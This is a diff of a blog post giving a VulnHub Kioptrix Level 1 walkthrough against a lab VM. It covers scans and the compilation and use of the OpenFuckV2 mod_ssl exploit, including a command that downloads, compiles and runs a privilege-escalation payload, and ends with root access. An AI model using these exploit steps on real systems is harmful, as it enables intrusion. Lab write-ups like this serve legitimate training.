@@ -1,12 +1,628 @@
 ---
 layout: post
-title:  "Kioptrix: Level 1 (#1)"
-date:   2019-05-10 13:46:19 +0000
+title: "Kioptrix: Level 1 (#1)"
+date: 2019-05-10 13:46:19 +0000
 author: Larry Brown
 category: Walkthroughs
 tags: [vulnhub]
 ---
-<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-
-<html><head><meta content="text/html; charset=utf-8" http-equiv="Content-Type"/><meta content="Evernote Mac 7.10 (457750)" name="exporter-version"/><meta content="Larry Brown" name="author"/><meta content="2019-05-10 13:46:19 +0000" name="created"/><meta content="desktop.mac" name="source"/><meta content="2019-05-11 01:56:23 +0000" name="updated"/><title>Kioptrix: Level 1 (#1)</title></head><body><div>VulnHub URL: <a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/" target="_blank">https://www.vulnhub.com/entry/kioptrix-level-1-1,22/</a></div><div>Hostname: kioptrix</div><div>IP Address: 10.183.0.224</div><div><br/></div><div><br/></div><div><h2>Information Gathering/Recon</h2></div><div><br/></div><div>The IP address is obtained via DHCP at boot. In my case, the IP is 10.183.0.224.</div><div><br/></div><div><br/></div><div><h2>Service Enumeration/Scanning</h2></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# nmap -Pn -sT -sV -sC -A -oA kioptrix1 -p- 10.183.0.224</div><div>Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-10 09:56 EDT</div><div>Nmap scan report for 10.183.0.224   </div><div>Host is up (0.0012s latency).</div><div>Not shown: 65529 closed ports</div><div>PORT     STATE SERVICE     VERSION  </div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">22/tcp   open  ssh         </font><font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">OpenSSH 2.9p2</font><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;"> (protocol 1.99)</font></div><div>| ssh-hostkey:</div><div>|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)</div><div>|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)</div><div>|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)</div><div>|_sshv1: Server supports SSHv1</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</font></div><div>| http-methods:</div><div>|_  Potentially risky methods: TRACE</div><div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/1.3.20 (Unix)</font>  (Red-Hat/Linux) <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">mod_ssl/2.8.4 OpenSSL/0.9.6b</font></div><div>|_http-title: Test Page for the Apache Web Server on Red Hat Linux</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">111/tcp  open  rpcbind     2 (RPC #100000)</font></div><div>| rpcinfo:</div><div>|   program version   port/proto  service</div><div>|   100000  2            111/tcp  rpcbind</div><div>|   100000  2            111/udp  rpcbind</div><div>|   100024  1           1024/tcp  status</div><div>|_  100024  1           1024/udp  status</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">139/tcp  open  netbios-ssn Samba smbd (workgroup: MYGROUP)</font></div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</font></div><div>|_http-server-header: <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/1.3.20 (Unix)</font>  (Red-Hat/Linux) <font style="color: rgb(255, 147, 0); --inversion-type-color: simple;">mod_ssl/2.8.4 OpenSSL/0.9.6b</font></div><div>|_http-title: 400 Bad Request</div><div>|_ssl-date: 2019-05-10T13:58:35+00:00; +1m50s from scanner time.</div><div>| sslv2: </div><div>|   SSLv2 supported</div><div>|   ciphers: </div><div>|     SSL2_RC4_64_WITH_MD5</div><div>|     SSL2_RC2_128_CBC_WITH_MD5</div><div>|     SSL2_RC4_128_EXPORT40_WITH_MD5</div><div>|     SSL2_RC4_128_WITH_MD5</div><div>|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5</div><div>|     SSL2_DES_192_EDE3_CBC_WITH_MD5</div><div>|_    SSL2_DES_64_CBC_WITH_MD5</div><div><font style="color: rgb(0, 253, 255); --inversion-type-color: simple;">1024/tcp open  status      1 (RPC #100024)</font></div><div>MAC Address: 00:0C:29:7C:3A:16 (VMware)</div><div>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</div><div>TCP/IP fingerprint:</div><div>OS:SCAN(V=7.70%E=4%D=5/10%OT=22%CT=1%CU=32224%PV=Y%DS=1%DC=D%G=Y%M=000C29%T</div><div>OS:M=5CD58418%P=x86_64-pc-linux-gnu)SEQ(SP=C9%GCD=1%ISR=D2%TI=Z%CI=Z%II=I%T</div><div>OS:S=7)OPS(O1=M5B4ST11NW0%O2=M5B4ST11NW0%O3=M5B4NNT11NW0%O4=M5B4ST11NW0%O5=</div><div>OS:M5B4ST11NW0%O6=M5B4ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=1</div><div>OS:6A0)ECN(R=Y%DF=Y%T=40%W=16D0%O=M5B4NNSNW0%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A</div><div>OS:=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=FF%W=0%S=A%A=Z%F=R%O=%RD=0%</div><div>OS:Q=)T5(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=FF%W=0%S=</div><div>OS:A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=FF%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=</div><div>OS:Y%DF=N%T=FF%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</div><div>OS:T=FF%CD=S)</div><div><div><br/></div></div><div>Network Distance: 1 hop</div><div><div><br/></div></div><div>Host script results:</div><div>|_clock-skew: mean: 1m49s, deviation: 0s, median: 1m49s</div><div>|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; (unknown)</div><div>|_smb2-time: Protocol negotiation failed (SMB2)</div><div><div><br/></div></div><div>TRACEROUTE</div><div>HOP RTT     ADDRESS</div><div>1   1.19 ms 10.183.0.224</div><div><div><br/></div></div><div>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</div><div>Nmap done: 1 IP address (1 host up) scanned in 284.78 seconds</div></div><div><br/></div><!--more--><div><br/></div><div><h2>Gaining Access</h2></div><div><br/></div><div>Checking on the versions of software returned by nmap, we have:</div><ul><li><div>OpenSSH 2.9p2 - common Username Enumeration issues</div></li><li><div>Apache/1.3.20 - a known overflow issue, but we don't know if mod_rewrite is enabled</div></li><li><div>mod_ssl/2.8.4 - a couple of promising remote buffer overflow issues</div></li><li><div>OpenSSL/0.9.6b - a SSLv2 overflow issue</div></li></ul><div><br/></div><div>Known Apache issues...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Apache &lt; 1.3.37/2.0.59/2.2.3 mod_rewrite - Remote Overflow                                                   | exploits/multiple/remote/2237.sh</div></div><div><br/></div><div>Known mod_ssl issues...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                         | exploits/unix/remote/21671.c</div><div>Apache mod_ssl &lt; 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow                                       | exploits/unix/remote/764.c</div></div><div><br/></div><div>Known OpenSSL issues...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Apache mod_ssl OpenSSL &lt; 0.9.6d / &lt; 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                 | exploits/unix/remote/40347.txt</div></div><div><br/></div><div>The colorfully named Remote Buffer Overflow mod_ssl exploit looks like our best option. I'll try version 2.</div><div><br/></div><div>After making the modifications specified here (including installing libssl-dev)...</div><div><a href="https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1" target="_blank">https://medium.com/@javarmutt/how-to-compile-openfuckv2-c-69e457b4a1d1</a></div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# apt-get install libssl-dev</div><div>root@kali:~/Walkthroughs/kioptrix1# diff 764.c.old 764.c</div><div>23a24,25</div><div>&gt; #include &lt;openssl/rc4.h&gt;</div><div>&gt; #include &lt;openssl/md5.h&gt;</div><div>663c665</div><div>&lt; #define COMMAND2 "unset HISTFILE; cd /tmp; wget http://packetstormsecurity.nl/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"</div><div>---</div><div>&gt; #define COMMAND2 "unset HISTFILE; cd /tmp; wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; \n"</div><div>961c963</div><div>&lt;       unsigned char *p, *end;</div><div>---</div><div>&gt;       const unsigned char *p, *end;</div><div>1069c1071,1072</div><div>&lt;       if (pkey-&gt;type != EVP_PKEY_RSA) {</div><div>---</div><div>&gt;       //if (pkey-&gt;type != EVP_PKEY_RSA) {</div><div>&gt;       if (EVP_PKEY_get1_RSA(pkey) == NULL) {</div><div>1075c1078,1079</div><div>&lt;       encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], pkey-&gt;pkey.rsa, RSA_PKCS1_PADDING);</div><div>---</div><div>&gt;       //encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], pkey-&gt;pkey.rsa, RSA_PKCS1_PADDING);</div><div>&gt;       encrypted_key_length = RSA_public_encrypt(RC4_KEY_LENGTH, ssl-&gt;master_key, &amp;buf[10], EVP_PKEY_get1_RSA(pkey), RSA_PKCS1_PADDING);</div></div><div><br/></div><div>...I was able to compile the exploit successfully.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# gcc -o openfv2 764.c -lcrypto</div></div><div><br/></div><div>Running our exploit to see applicable parameters, we have two options (based on our version of OS/Apache).</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# ./openfv2</div><div><div><br/></div></div><div>*******************************************************************</div><div>* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</div><div>*******************************************************************</div><div>* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</div><div>* #hackarena  irc.brasnet.org                                     *</div><div>* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</div><div>* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</div><div>* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</div><div>*******************************************************************</div><div><div><br/></div></div><div>: Usage: ./openfv2 target box [port] [-c N]</div><div><div><br/></div></div><div>  target - supported box eg: 0x00   </div><div>  box - hostname or IP address</div><div>  port - port for ssl connection</div><div>  -c open N connections. (use range 40-50 if u dont know)</div><div><div><br/></div><div><br/></div></div><div>  Supported OffSet:</div><div>[...snip...]</div><div>        0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1</div><div>        0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2</div><div>[...snip...]</div></div><div><br/></div><div>Trying the first option (0x6a) fails. Trying the second option (0x6b), we get the following...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# ./openfv2 0x6b 10.183.0.224</div><div><div><br/></div></div><div>*******************************************************************</div><div>* OpenFuck v3.0.32-root priv8 by SPABAM based on openssl-too-open *</div><div>*******************************************************************</div><div>* by SPABAM    with code of Spabam - LSD-pl - SolarEclipse - CORE *</div><div>* #hackarena  irc.brasnet.org                                     *</div><div>* TNX Xanthic USG #SilverLords #BloodBR #isotk #highsecure #uname *</div><div>* #ION #delirium #nitr0x #coder #root #endiabrad0s #NHC #TechTeam *</div><div>* #pinchadoresweb HiTechHate DigitalWrapperz P()W GAT ButtP!rateZ *</div><div>*******************************************************************</div><div><div><br/></div></div><div>Establishing SSL connection</div><div>cipher: 0x4043808c   ciphers: 0x80fc080</div><div>Ready to send shellcode</div><div>Spawning shell...</div><div>bash: no job control in this shell</div><div>bash-2.05$ </div><div>-exploits/ptrace-kmod.c; gcc -o p ptrace-kmod.c; rm ptrace-kmod.c; ./p; net/0304 </div><div>--15:21:00--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</div><div>           =&gt; `ptrace-kmod.c'</div><div>Connecting to dl.packetstormsecurity.net:443... connected!</div><div>HTTP request sent, awaiting response... 200 OK</div><div>Length: 3,921 [text/x-csrc]</div><div><div><br/></div></div><div>    0K ...                                                   100% @   3.74 MB/s</div><div><div><br/></div></div><div>15:21:00 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]</div><div><div><br/></div></div><div>[+] Attached to 7398</div><div>[+] Signal caught</div><div>[+] Shellcode placed at 0x4001189d</div><div>[+] Now wait for suid shell...</div><div>id</div><div>uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)</div></div><div><br/></div><div>We have a root shell! Mission accomplished.</div><div><br/></div><div><br/></div><div><h2>Maintaining Access</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Privilege Escalation</h2></div><div>N/A</div><div><br/></div><div><h2>Pivoting</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Clean Up</h2></div><div>N/A</div><div><br/></div><div><br/></div><div><h2>Additional Info</h2></div><div><br/></div><div><span style="font-weight: bold;">Checking root's mail</span></div><div><br/></div><div>There's a "friendly" message for us in /var/mail/root...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>cat /var/mail/root</div><div>From root  Sat Sep 26 11:42:10 2009</div><div>Return-Path: &lt;root@kioptix.level1&gt;</div><div>Received: (from root@localhost)</div><div>        by kioptix.level1 (8.11.6/8.11.6) id n8QFgAZ01831</div><div>        for root@kioptix.level1; Sat, 26 Sep 2009 11:42:10 -0400</div><div>Date: Sat, 26 Sep 2009 11:42:10 -0400</div><div>From: root &lt;root@kioptix.level1&gt;</div><div>Message-Id: &lt;200909261542.n8QFgAZ01831@kioptix.level1&gt;</div><div>To: root@kioptix.level1</div><div>Subject: About Level 2</div><div>Status: O</div><div><div><br/></div></div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">If you are reading this, you got root. Congratulations.</font></div><div><font style="color: rgb(147, 255, 5); --inversion-type-color:  simple;">Level 2 won't be as easy...</font></div><div><div><br/></div></div><div>From root  Fri May 10 10:00:19 2019</div><div>Return-Path: &lt;root@kioptrix.level1&gt;</div><div>Received: (from root@localhost)</div><div>        by kioptrix.level1 (8.11.6/8.11.6) id x4AE0JI01185</div><div>        for root; Fri, 10 May 2019 10:00:19 -0400</div><div>Date: Fri, 10 May 2019 10:00:19 -0400</div><div>From: root &lt;root@kioptrix.level1&gt;</div><div>Message-Id: &lt;201905101400.x4AE0JI01185@kioptrix.level1&gt;</div><div>To: root@kioptrix.level1</div><div>Subject: LogWatch for kioptrix.level1</div><div><div><br/></div><div><br/></div></div><div><div><br/></div></div><div> ################## LogWatch 2.1.1 Begin ##################### </div><div><div><br/></div></div><div><div><br/></div></div><div> ###################### LogWatch End #########################</div></div><div><br/></div><div><br/></div><div><span style="font-weight: bold;">Other Paths to Root?</span></div><div><br/></div><div>The intro message for the VM said...</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>Welcome to Kioptrix Level 1 Penetration and Assessment Environment</div><div><div><br/></div></div><div>--The object of this game:</div><div>|_Acquire "root" access to this machine.</div><div><div><br/></div></div><div>There are many ways this can be done, try and find more then one way to</div><div>appreciate this exercise.</div></div><div><br/></div><div>So, let's see if we can find any other ways to get root on the box.</div><div><br/></div><div>We'll start by looking into the HTTP service on TCP port 80. The default site for the service is the Apache Test Page. The service doesn't have a robots.txt file. Let's scan it with nikto.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# nikto -h <a href="http://10.183.0.224">http://10.183.0.224</a></div><div>- Nikto v2.1.6</div><div>---------------------------------------------------------------------------</div><div>+ Target IP:          10.183.0.224  </div><div>+ Target Hostname:    10.183.0.224  </div><div>+ Target Port:        80</div><div>+ Start Time:         2019-05-10 10:20:30 (GMT-4)</div><div>---------------------------------------------------------------------------</div><div>+ Server: <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">Apache/1.3.20 (Unix)</span>  (Red-Hat/Linux) <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">mod_ssl/2.8.4 OpenSSL/0.9.6b</span></div><div>+ Server may leak inodes via ETags, header found with file /, inode: 34821, size: 2890, mtime: Wed Sep  5 23:12:46 2001</div><div>+ The anti-clickjacking X-Frame-Options header is not present.</div><div>+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</div><div>+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</div><div>+ OSVDB-27487: Apache is vulnerable to XSS via the Expect header</div><div>+ OpenSSL/0.9.6b appears to be outdated (current is at least 1.1.1). OpenSSL 1.0.0o and 0.9.8zc are also current.</div><div>+ Apache/1.3.20 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</div><div>+ mod_ssl/2.8.4 appears to be outdated (current is at least 2.8.31) (may depend on server version)</div><div>+ OSVDB-838: Apache/1.3.20 - Apache 1.x up 1.2.34 are vulnerable to a remote DoS and possible <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">code execution</span>. CAN-2002-0392.</div><div>+ OSVDB-4552: Apache/1.3.20 - Apache 1.3 below 1.3.27 are vulnerable to a local buffer overflow which allows attackers to kill any process on the system. CAN-2002-0839.</div><div>+ OSVDB-2733: Apache/1.3.20 - Apache 1.3 below 1.3.29 are vulnerable to <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">overflows in mod_rewrite and mod_cgi</span>. CAN-2003-0542.</div><div>+ mod_ssl/2.8.4 - mod_ssl 2.8.7 and lower are vulnerable to a <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">remote buffer overflow which may allow a remote shell</span>. <a href="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082" target="_blank">http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082</a>, OSVDB-756.</div><div>+ Allowed HTTP Methods: GET, HEAD, OPTIONS, TRACE</div><div>+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</div><div>+ ///etc/hosts: The server install allows reading of any system file by adding an extra '/' to the URL.</div><div><span style="color: rgb(41, 41, 41); --inversion-type-color:  simple;">+ OSVDB-682: /usage/: Webalizer may be installed. Versions lower than 2.01-09 vulnerable to Cross Site Scripting (XSS).</span></div><div>+ OSVDB-3268: /manual/: Directory indexing found.</div><div>+ OSVDB-3092: /manual/: Web server manual found.</div><div>+ OSVDB-3268: /icons/: Directory indexing found.</div><div>+ OSVDB-3233: /icons/README: Apache default file found.</div><div>+ OSVDB-3092: <span style="color: rgb(255, 147, 0); --inversion-type-color: simple;">/test.php</span>: This might be interesting...</div><div>+ /wp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div><div>+ /wordpresswp-content/themes/twentyeleven/images/headers/server.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div><div>+ /wp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div><div>+ /wordpresswp-includes/Requests/Utility/content-post.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div><div>+ /wp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div><div>+ /wordpresswp-includes/js/tinymce/themes/modern/Meuhy.php?filesrc=/etc/hosts: A PHP backdoor file manager was found.</div><div>+ /assets/mobirise/css/meta.php?filesrc=: A PHP backdoor file manager was found.</div><div>+ /login.cgi?cli=aa%20aa%27cat%20/etc/hosts: Some D-Link router remote command execution.</div><div>+ /shell?cat+/etc/hosts: A backdoor was identified.</div><div>+ 8724 requests: 0 error(s) and 30 item(s) reported on remote host</div><div>+ End Time:           2019-05-10 10:21:02 (GMT-4) (32 seconds)</div><div>---------------------------------------------------------------------------</div><div>+ 1 host(s) tested</div></div><div><br/></div><div>The test.php page returns PHP code that has not been executed.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# curl <a href="http://10.183.0.224/test.php">http://10.183.0.224/test.php</a></div><div>&lt;?php4</div><div><br/></div><div>        print "TEST";</div><div><br/></div><div>?&gt;</div></div><div><br/></div><div>This could be because the tags are wrapped with 'php4' or because PHP files are not supported by the server.</div><div><br/></div><div>Next, I'll run dirb to see what else might be on the server.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 0.14902);-en-codeblock:true;'><div>root@kali:~/Walkthroughs/kioptrix1# dirb <a href="http://10.183.0.224">http://10.183.0.224</a> /usr/share/dirb/wordlists/big.txt -o dirb-http-10.183.0.224.txt</div><div><br/></div><div>-----------------</div><div>DIRB v2.22</div><div>By The Dark Raver</div><div>-----------------</div><div><br/></div><div>OUTPUT_FILE: dirb-http-10.183.0.224.txt</div><div>START_TIME: Fri May 10 10:38:25 2019</div><div>URL_BASE: <a href="http://10.183.0.224/">http://10.183.0.224/</a></div><div>WORDLIST_FILES: /usr/share/dirb/wordlists/big.txt</div><div><br/></div><div>-----------------</div><div><br/></div><div>GENERATED WORDS: 20458</div><div><br/></div><div>---- Scanning URL: <a href="http://10.183.0.224/">http://10.183.0.224/</a> ----</div><div>+ <a href="http://10.183.0.224/cgi-bin/">http://10.183.0.224/cgi-bin/</a> (CODE:403|SIZE:272)</div><div>==&gt; DIRECTORY: <a href="http://10.183.0.224/manual/">http://10.183.0.224/manual/</a></div><div>==&gt; DIRECTORY: <a href="http://10.183.0.224/mrtg/">http://10.183.0.224/mrtg/</a></div><div>==&gt; DIRECTORY: <a href="http://10.183.0.224/usage/">http://10.183.0.224/usage/</a></div><div>+ <a href="http://10.183.0.224/~operator">http://10.183.0.224/~operator</a> (CODE:403|SIZE:273)</div><div>+ <a href="http://10.183.0.224/~root">http://10.183.0.224/~root</a> (CODE:403|SIZE:269)</div><div><br/></div><div>---- Entering directory: <a href="http://10.183.0.224/manual/">http://10.183.0.224/manual/</a> ----</div><div>(!) WARNING: Directory IS LISTABLE. No need to scan it.</div><div>    (Use mode '-w' if you want to scan it anyway)</div><div><br/></div><div>---- Entering directory: <a href="http://10.183.0.224/mrtg/">http://10.183.0.224/mrtg/</a> ----</div><div><br/></div><div>---- Entering directory: <a href="http://10.183.0.224/usage/">http://10.183.0.224/usage/</a> ----</div><div><br/></div><div>-----------------</div><div>END_TIME: Fri May 10 10:41:07 2019</div><div>DOWNLOADED: 61374 - FOUND: 3</div></div><div><br/></div><div>Checking out the Webalizer page, we see a few URLs listed in the Sep 2009 log.</div><div><br/></div><div><img height="282" src="/assets/images/2019-05-10-kioptrix-level-1-1/A4C1F99B-69DB-4D1C-8113-896614E50D1D.png" width="1038"/><br/></div><div><br/></div><div>We also see some user agent strings logged.</div><div><br/></div><div><img height="238" src="/assets/images/2019-05-10-kioptrix-level-1-1/C5F30A4D-FA9E-4A93-9F57-2035F170E14D.png" width="1042"/><br/></div><div><br/></div><div>I tried browsing the available sites on the server with the user agent in the log (Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3), but nothing changed. I then decided to try to use curl to "browse" with a malicious user agent string and see if I could get it to run when checking the stats. The log only includes up to 62 characters, so my command will have to be pretty short. Unfortunately, that didn't work either. Webalizer appears to be filtering out tags from the user agent and referrer logs.</div><div><br/></div><div>Looking in the manual directory, I noticed something interesting.</div><div><br/></div><div><a href="http://10.183.0.224/manual/mod/">http://10.183.0.224/manual/mod/</a></div><div><br/></div><div><img height="526" src="/assets/images/2019-05-10-kioptrix-level-1-1/07E34D18-31F0-4E98-BCE4-DA1B41C1DF18.png" width="1026"/><br/></div><div><br/></div><div>Looks like mod_perl might be set up on the server. Based on this, plus the fact that 'test.php' wasn't being recognized as PHP code, me thinks PHP is not going to be the language of choice. I also know that MRTG is written in perl, so everything is pointing to the fact that Perl is going to be the only language supported... which is tough to embed in regular HTML pages. Moving on...</div><div><br/></div><div>Looking at the samba service, I decided to use enum4linux to pull a bunch of details. I also ran 'smb-vuln-*' scripts provided by nmap.</div><div><br/></div><div class="evernote-code-box" style='box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, "Courier New", monospace; font-size: 12px; color: #e6e6e6; border-top-left-radius: 4px; border-top-right-radius: 4px; border-bottom-right-radius: 4px; border-bottom-left-radius: 4px; background-color: #262626; border: 1px solid rgba(0, 0, 0, 